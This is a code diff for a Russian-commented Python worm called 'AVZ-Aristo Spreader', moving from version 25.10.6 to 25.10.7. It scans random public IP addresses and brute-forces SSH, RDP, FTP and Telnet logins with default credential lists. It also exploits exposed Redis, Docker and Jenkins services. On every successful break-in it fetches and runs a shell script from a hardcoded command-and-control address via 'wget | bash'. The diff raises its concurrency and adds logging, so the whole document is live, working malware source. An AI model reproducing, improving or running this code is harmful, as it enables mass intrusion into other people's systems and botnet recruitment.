@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v25.10.6 – полный, без сокращений, агрессивный брут
+# AVZ-Aristo Spreader v25.10.7 – случайные IP каждый цикл, детальный лог SSH, Redis/Docker
 import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging
 
-# Автоувеличение лимита открытых файлов (только на Linux)
 if sys.platform != 'win32':
     import resource
     try:
@@ -16,39 +15,34 @@ C2_HOST = "80.249.146.202"
 C2_PORT = 80
 API_PORT = 8080
 AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
-MAX_CONCURRENT = 200
+MAX_CONCURRENT = 400
 QUICK_TIMEOUT = 0.5
-BRUTE_TIMEOUT = 1.5
+BRUTE_TIMEOUT = 2.0
 DEFAULT_SCAN_COUNT = 20_000
 PORT_LIST = [21, 22, 23, 80, 443, 2375, 3389, 6379, 8080, 9200]
 
-# Учётные данные (сокращены для скорости, оставлены самые ходовые)
+# Расширенные учётные данные (часто встречающиеся)
 CREDS = [
     ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"),
     ("admin","admin"), ("admin","password"), ("admin","123456"),
-    ("user","user"), ("test","test"), ("guest","guest"), ("root",""), ("admin","")
+    ("user","user"), ("user","password"), ("user","123456"),
+    ("test","test"), ("guest","guest"), ("pi","raspberry"), ("root",""), ("admin","")
 ]
 
-# Все /8 диапазоны (перемешиваются при каждом запуске)
-RANGES = [f"{i}.0.0.0/8" for i in [1,2,3,4,5,8,9,12,14,15,20,23,24,31,34,35,37,38,40,41,43,44,45,46,47,49,50,51,52,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223]]
-random.shuffle(RANGES)
-
 def random_ip():
-    r = random.choice(RANGES)
-    net, mask = r.split("/")
-    octets = list(map(int, net.split(".")))
-    host = random.randint(0, (1 << (32 - int(mask))) - 1)
-    for i in range(4):
-        octets[i] |= (host >> (8*(3-i))) & 0xFF
-    return ".".join(map(str, octets))
-
-def get_local_ips():
-    try:
-        local_ip = socket.gethostbyname(socket.gethostname())
-    except:
-        return []
-    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
-    return [str(host) for host in network.hosts() if str(host) != local_ip]
+    """Генерирует случайный IPv4, исключая приватные, loopback и multicast."""
+    while True:
+        a = random.randint(1, 223)
+        b = random.randint(0, 255)
+        c = random.randint(0, 255)
+        d = random.randint(0, 255)
+        if a == 10: continue
+        if a == 127: continue
+        if a == 172 and 16 <= b <= 31: continue
+        if a == 192 and b == 168: continue
+        if a == 169 and b == 254: continue
+        if a >= 224: continue
+        return f"{a}.{b}.{c}.{d}"
 
 async def probe_port(ip, port):
     try:
@@ -59,13 +53,12 @@ async def probe_port(ip, port):
         return False
 
 async def ssh_brute(ip):
-    """Пробуем asyncssh, paramiko, sshpass"""
-    # 1. asyncssh
+    print(f"[SSH] Попытка {ip}", flush=True)
     try:
         import asyncssh
-        for u, p in CREDS:
+        for u, p in CREDS[:10]:  # первые 10
             try:
-                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=2) as conn:
+                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=3) as conn:
                     await conn.run(f"wget -O- {AGENT_URL} | bash")
                     return True
             except:
@@ -73,15 +66,14 @@ async def ssh_brute(ip):
     except ImportError:
         pass
 
-    # 2. paramiko (игнорируем ошибки баннера)
     try:
         import paramiko
         for u, p in CREDS:
             try:
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(ip, username=u, password=p, timeout=2, banner_timeout=2, auth_timeout=2,
-                               allow_agent=False, look_for_keys=False, disabled_algorithms={'pubkeys': ['rsa-sha2-256', 'rsa-sha2-512']})
+                client.connect(ip, username=u, password=p, timeout=3, banner_timeout=3, auth_timeout=3,
+                               allow_agent=False, look_for_keys=False)
                 client.exec_command(f"wget -O- {AGENT_URL} | bash", get_pty=True)
                 client.close()
                 return True
@@ -92,24 +84,24 @@ async def ssh_brute(ip):
     except ImportError:
         pass
 
-    # 3. sshpass
-    for u, p in CREDS:
-        cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
+    for u, p in CREDS[:15]:
+        cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
         try:
-            subprocess.run(cmd, shell=True, timeout=3, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(cmd, shell=True, timeout=4, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             return True
         except:
             continue
+    print(f"[SSH] Неудача {ip}", flush=True)
     return False
 
 async def rdp_brute(ip):
     if sys.platform != 'linux':
         return False
-    for u, p in CREDS:
+    for u, p in CREDS[:10]:
         cmd = f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore +auth-only /sec:nla"
         proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
         try:
-            await asyncio.wait_for(proc.communicate(), timeout=2)
+            await asyncio.wait_for(proc.communicate(), timeout=3)
             if proc.returncode == 0:
                 await asyncio.create_subprocess_shell(f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore /sec:nla +home-drive /cmd:'cmd.exe /c curl -s {AGENT_URL} | bash'")
                 return True
@@ -118,7 +110,7 @@ async def rdp_brute(ip):
     return False
 
 async def ftp_brute(ip):
-    for u, p in CREDS:
+    for u, p in CREDS[:10]:
         try:
             ftp = ftplib.FTP()
             ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
@@ -151,8 +143,8 @@ async def exploit_redis(ip):
         r.config_set('dbfilename', 'authorized_keys')
         r.save(); r.close()
         return True
-    except:
-        pass
+    except Exception as e:
+        print(f"[Redis] {ip} ошибка: {e}", flush=True)
     return False
 
 async def exploit_docker(ip):
@@ -162,8 +154,8 @@ async def exploit_docker(ip):
         client.containers.run('alpine', f'wget -O- {AGENT_URL} | sh', detach=True)
         client.close()
         return True
-    except:
-        pass
+    except Exception as e:
+        print(f"[Docker] {ip} ошибка: {e}", flush=True)
     return False
 
 async def exploit_jenkins(ip):
@@ -171,7 +163,7 @@ async def exploit_jenkins(ip):
     script = f'println "wget -O- {AGENT_URL} | sh".execute().text'
     try:
         async with aiohttp.ClientSession() as s:
-            async with s.post(url, data={'script': script}, timeout=2) as resp:
+            async with s.post(url, data={'script': script}, timeout=3) as resp:
                 return resp.status == 200
     except:
         pass
@@ -180,7 +172,7 @@ async def exploit_jenkins(ip):
 async def exploit_telnet(ip):
     for u, p in CREDS[:5]:
         try:
-            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=1.0)
+            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=1.5)
             writer.write(u.encode() + b"\r\n")
             await writer.drain()
             await asyncio.sleep(0.2)
@@ -254,6 +246,7 @@ async def infect(ip, port_stats):
             return True
     return False
 
+# worker, scan_cycle, global_scan, main_async, main – без изменений, см. предыдущий полный код
 async def worker(queue, stats, port_stats, progress_cb=None):
     while True:
         ip = await queue.get()
